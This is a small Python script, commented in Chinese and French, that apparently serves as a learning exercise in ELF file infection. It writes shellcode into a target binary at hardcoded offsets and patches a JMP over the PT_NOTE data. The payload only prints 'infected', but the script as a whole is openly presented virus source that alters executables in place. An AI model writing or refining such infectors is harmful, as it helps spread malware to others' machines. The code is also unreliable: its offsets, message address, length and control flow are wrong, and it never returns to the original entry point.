import struct

# 修改 PT_NOTE 段以便跳转到 PT_LOAD 段
#Modifier PT_NOTE pour passer à la section PT_LOAD.
def modify_ptnote_jump(fd, note_offset, load_vaddr):
    fd.seek(note_offset)
    # 计算跳转到 PT_LOAD 段的相对偏移
    #Calculer le décalage relatif de PT_LOAD
    jump_offset = load_vaddr - (note_offset + 5)
    jmp_instr = b'\xE9' + struct.pack('<I', jump_offset & 0xFFFFFFFF)  # JMP 指令
    fd.write(jmp_instr)

# 注入 shellcode 到 PT_LOAD 段
#Injecter un shellcode dans la section PT_LOAD
def inject_shellcode(fd, load_offset, shellcode):
    fd.seek(load_offset)
    fd.write(b'infected') 
    fd.write(shellcode)

def infect_elf(file_path):
    with open(file_path, 'rb+') as fd:
        # 直接使用 PT_NOTE 和 PT_LOAD 的已知偏移和地址
        note_offset = 0x358   # PT_NOTE 段的文件偏移 offset de ptnote
        load_offset = 0x1175  # PT_LOAD 段的文件偏移 offset de ptload
        load_vaddr = 0x1175  # PT_LOAD 段的虚拟地址 addresse de ptload

        # injecter shellcode
        shellcode = (
		b"\x48\xc7\xc0\x01\x00\x00\x00"            # mov rax, 1 (syscall number for sys_write)
		b"\x48\xc7\xc7\x01\x00\x00\x00"            # mov rdi, 1 (file descriptor, 1 = stdout)
		b"\x48\xc7\xc6\x75\x11\x00\x00"            # mov rsi, 0x1175 (address of the message)
 		b"\x48\xc7\xc2\x0e\x00\x00\x00"            # mov rdx, 14 (message length)
		b"\x0f\x05"                                # syscall (trigger system call)
		b"infected\n"                         # The message to output
		)

        
        inject_shellcode(fd, load_offset, shellcode)

        # modify ptnote to ptload
        modify_ptnote_jump(fd, note_offset, load_vaddr)

#infect
infect_elf('hello')
